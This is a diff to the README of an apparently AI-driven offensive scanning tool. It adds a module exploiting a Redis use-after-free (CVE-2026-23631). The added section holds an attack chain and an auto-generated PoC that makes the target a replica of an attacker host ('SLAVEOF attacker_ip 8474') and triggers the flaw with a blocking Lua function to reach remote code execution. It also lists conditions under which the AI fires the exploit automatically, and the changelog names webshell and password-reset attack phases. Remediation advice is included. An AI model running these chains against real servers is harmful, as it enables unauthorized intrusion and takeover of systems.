@@ -520,6 +520,107 @@ curl -sk 'https://target.com/' \
 
 ---
 
+### Redis DarkReplica UAF → Post-Auth RCE (CVE-2026-23631) (v2.1)
+
+> **Research basis:**  
+> [Yoni Sherez — "DarkReplica: Redis CVE-2026-23631"](https://www.zeroday.cloud/blog/redis-cve-2026-23631-dark-replica)  
+> **$30,000** at London Security Conference 2025  
+> **Skill module:** `RedisDarkReplica` (id: 48)
+
+**Vulnerability overview:**
+
+Redis is single-threaded, but calls `processEventsWhileBlocked()` during Lua function execution timeouts. This allows the replication subsystem to process `FULLRESYNC` events from a master server **while a Lua function is still running**. The `lua_State` object gets freed mid-execution, leading to a **Use-After-Free (UAF)** condition that enables arbitrary read/write primitives and ultimately code execution.
+
+**Attack chain:**
+
+```
+① Attacker authenticates to Redis (requires credentials OR no-auth Redis)
+
+② Register slow Lua function (blocks for >lua-time-limit ms)
+   FUNCTION LOAD "#!lua name=exploit\nredis.register_function('slow',
+     function(keys,argv) while 1 do end end)"
+
+③ Assign victim Redis as slave of attacker's fake master server
+   SLAVEOF attacker_ip 8474
+   CONFIG SET slave-read-only no
+
+④ Attacker's fake master sends FULLRESYNC at exact moment Lua is running
+   → processEventsWhileBlocked() frees lua_State while Lua still executing
+
+⑤ UAF: Heap spray reallocates freed memory with attacker data
+   → Arbitrary read/write → ASLR bypass → system() → RCE
+```
+
+**AI auto-trigger conditions** (bingo automatically activates when):
+
+| Condition | Detection method |
+|-----------|-----------------|
+| Port 6379/6380/6381/6382 open | TCP connect probe |
+| Redis PING → PONG response | Banner confirmation |
+| `redis`, `jedis`, `ioredis` in target URL/body | Keyword scan |
+| Redis credentials found in previous scan | Session credential store |
+
+**Finding types and evidence levels:**
+
+| Finding | Evidence Level | Severity |
+|---------|---------------|----------|
+| `redis_found` | `VERIFIED` (PING→PONG) | Info |
+| `redis_noauth` | `VERIFIED` (no AUTH required) | Critical |
+| `redis_weak_auth` | `VERIFIED` (AUTH '' success) | Critical |
+| `redis_auth_success` | `VERIFIED` (AUTH credential success) | High |
+| `vulnerable_version` | `VERIFIED` (INFO server version check) | Critical |
+| `patched_version` | `VERIFIED` | Info |
+| `slaveof_allowed` | `VERIFIED` (SLAVEOF NO ONE → OK) | High |
+| `function_engine_available` | `VERIFIED` (FUNCTION LIST response) | High |
+| `dark_replica_exploitable` | `VERIFIED` (all conditions confirmed) | Critical |
+| `dark_replica_likely` | `LIKELY` (version vulnerable, partial perms) | Critical |
+
+**Affected versions:**
+
+| Series | Vulnerable | Fixed |
+|--------|-----------|-------|
+| 7.2.x | 7.2.0 – 7.2.13 | **7.2.14** |
+| 7.4.x | 7.4.0 – 7.4.8 | **7.4.9** |
+| 8.2.x | 8.2.0 – 8.2.5 | **8.2.6** |
+| 8.4.x | 8.4.0 – 8.4.2 | **8.4.3** |
+| 8.6.x | 8.6.0 – 8.6.2 | **8.6.3** |
+
+**Auto-generated PoC (included in report):**
+
+```bash
+# Step 1: Verify vulnerable version
+redis-cli -h TARGET -p 6379 INFO server | grep redis_version
+
+# Step 2: Register slow Lua function
+redis-cli -h TARGET -p 6379 FUNCTION LOAD \
+  "#!lua name=exploit\nredis.register_function('slow', \
+   function(keys,argv) local co=coroutine.create(function() while 1 do end end); \
+   coroutine.resume(co) end)"
+
+# Step 3: Assign victim as slave of attacker
+redis-cli -h TARGET -p 6379 SLAVEOF attacker_ip 8474
+redis-cli -h TARGET -p 6379 CONFIG SET slave-read-only no
+
+# Step 4: Trigger UAF (run fake master + FCALL simultaneously)
+redis-cli -h TARGET -p 6379 FCALL slow 0
+# Expected: RCE via system() after heap spray
+```
+
+**Zero-Hallucination guarantee:**
+- Version check performed via actual `INFO server` response → `VERIFIED`
+- All permission checks (SLAVEOF, FUNCTION) are read-safe and non-destructive
+- Exploitability flag only set when ALL conditions confirmed
+
+**Remediation (auto-included in report):**
+1. **Patch immediately** — upgrade to fixed version for your series
+2. **Block Redis externally** — firewall port 6379 from public internet
+3. **Enable authentication** — `requirepass <strong-random-password>`
+4. **ACL restrictions** — limit `SLAVEOF`, `REPLICAOF`, `FUNCTION LOAD` to admin users only
+5. **Reduce Lua time limit** — `lua-time-limit 500` to minimize UAF trigger window
+6. **Network isolation** — bind Redis to `127.0.0.1` or internal VLAN only
+
+---
+
 ### CSWSH + EXE Exposure + Localhost WebSocket RCE Chain (v2.1)
 
 > **Research basis:**  
@@ -862,7 +963,7 @@ bingo/
 - **IDOR Phase** — real-world IDOR enumeration, PII detection, and IDOR-based password reset with login verification
 - **Full i18n** — all UI strings (skill module names, commands, evidence labels) in Korean / Chinese / English
 - **9-phase pipeline** — extended from 5 to 9 phases (webshell acquisition, IDOR, login verification added)
-- **47 skill modules** — added ClientSideAuthBypass (#40), ApiDiscoveryFuzzing (#41), MSSQL2025AIExploit (#42), ArubaOsXxeSsrf (#43), IvantiSentryRCE (#44), OAuthChainAttack (#45), CswshRceChain (#46), NextJsCacheSxss (#47)
+- **48 skill modules** — added ClientSideAuthBypass (#40), ApiDiscoveryFuzzing (#41), MSSQL2025AIExploit (#42), ArubaOsXxeSsrf (#43), IvantiSentryRCE (#44), OAuthChainAttack (#45), CswshRceChain (#46), NextJsCacheSxss (#47), RedisDarkReplica (#48)
 - Production-stable (`Development Status :: 5 - Production/Stable`)
 
 ### v2.0.x — Beta
